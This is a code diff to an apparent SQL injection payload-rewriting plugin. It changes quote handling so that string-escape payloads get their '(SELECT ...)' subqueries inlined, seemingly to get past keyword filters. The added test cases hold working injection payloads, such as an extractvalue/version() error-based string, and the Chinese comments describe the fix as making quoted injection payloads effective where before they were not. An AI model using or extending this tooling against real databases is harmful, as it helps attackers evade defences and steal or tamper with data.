@@ -6,6 +6,33 @@
 // 带 FROM 的子查询（真取数）保持原样 —— 那类没有无 SELECT 的等价形式。
 // 引号状态机：字符串/标识符字面量内的 "SELECT" 与括号一律不动。
 
+/** 从 `from` 之后（不含）起，是否还存在同型引号 —— 有则该引号是字符串定界符，
+ *  没有则它是逃逸闭合符（其后是代码层）。扫描时跳过 `\` 转义。
+ * @param {string} s @param {number} from @param {string} q @returns {boolean} */
+function hasClosingQuote(s, from, q) {
+  for (let k = from + 1; k < s.length; k += 1) {
+    if (s[k] === '\\') { k += 1; continue; }
+    if (s[k] === q) return true;
+  }
+  return false;
+}
+
+// 逃逸闭合符的**尾部特征**：引号之后紧跟 SQL 关键字 / 行注释 / 右括号 / 分号 / 行尾。
+// 反例（不能判逃逸）：`name='(SELECT x)'` 后跟 `(`；`CONCAT('__S__',...)` 后跟 `,`
+// / 标识符 —— 那些是真正的字符串定界符。
+const ESCAPE_TAIL = /^\s*(?:--|#|\/\*|\)|;)/;
+const ESCAPE_END = /^\s*$/;
+const ESCAPE_KW = /^\s+(?:and|or|xor|union|select|order|group|having|where|limit|from|set|values|procedure|into|extractvalue|updatexml|sleep|benchmark|if|case)\b/i;
+
+/**
+ * 该位置的引号是不是**逃逸闭合符**（闭合业务 SQL 的引号，其后是代码层）。
+ * @param {string} s @param {number} i 引号所在下标 @returns {boolean}
+ */
+function isEscapeQuote(s, i) {
+  const tail = s.slice(i + 1);
+  return ESCAPE_TAIL.test(tail) || ESCAPE_END.test(tail) || ESCAPE_KW.test(tail);
+}
+
 /** 字符串字面量内容打码（保留引号与占位宽度）后，FROM 关键词是否真的出现在代码层。
  *  字符串里的 'FROM users' 不是表引用 —— 直接正则会把它误判成有 FROM 而放弃内联。 */
 function hasTopLevelFrom(expr) {
@@ -31,6 +58,11 @@ export const scalarselectinline = {
     { input: '1 AND (SELECT 1 FROM (SELECT 1,2) x)=1', output: '1 AND (SELECT 1 FROM (SELECT 1,2) x)=1' },
     // 字符串字面量内的 "SELECT" 与括号不动
     { input: "1 AND name='(SELECT x)'", output: "1 AND name='(SELECT x)'" },
+    // [2026-10-08] 逃逸闭合符 ≠ 字符串开始：字符串型注入点（`1' ... -- -`）的引号
+    // 在**本片段内没有配对**，其后是代码层。此前整串被当字符串 ⇒ 这类 payload 100% 空转。
+    { input: "1' AND (SELECT version())-- -", output: "1' AND version()-- -" },
+    { input: "1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -", output: "1' AND extractvalue(1,concat(0x7e,version()))-- -" },
+    { input: '1 AND (SELECT version())=1', output: '1 AND version()=1' },
     // 嵌套：内层先内联，外层随后（幂等收敛）
     { input: '1 AND (SELECT CONCAT((SELECT 1)))=1', output: '1 AND CONCAT(1)=1' },
   ],
@@ -56,7 +88,18 @@ export const scalarselectinline = {
           i += 1;
           continue;
         }
-        if (ch === "'" || ch === '"' || ch === '`') { inStr = ch; out += ch; i += 1; continue; }
+        if (ch === "'" || ch === '"' || ch === '`') {
+          // ⚠️ [2026-10-08 修复] 未配对的引号是**逃逸闭合符**，不是字符串开始。
+          //   `1' AND (SELECT version())-- -` 里那个 `'` 闭合的是业务 SQL 的引号，
+          //   其后的 payload 处在**代码层**；旧逻辑无条件进字符串态 ⇒ 找不到第二个引号
+          //   ⇒ 整串被当成字符串 ⇒ 这条插件在**所有带引号的注入 payload 上 100% 空转**。
+          //   而字符串型注入点（`WHERE name='$x'`）恰恰必须带引号才能逃逸 —— 空转的
+          //   正是最需要它的那一类。判据：向后扫（跳过 \ 转义）存在同型引号才算字符串。
+          if (hasClosingQuote(s, i, ch) && !isEscapeQuote(s, i)) inStr = ch;
+          out += ch;
+          i += 1;
+          continue;
+        }
         if (ch === '(' && /^\(\s*select[\s(]/i.test(s.slice(i, i + 16))) {
           // 引号感知地找配对右括号
           let depth = 0;
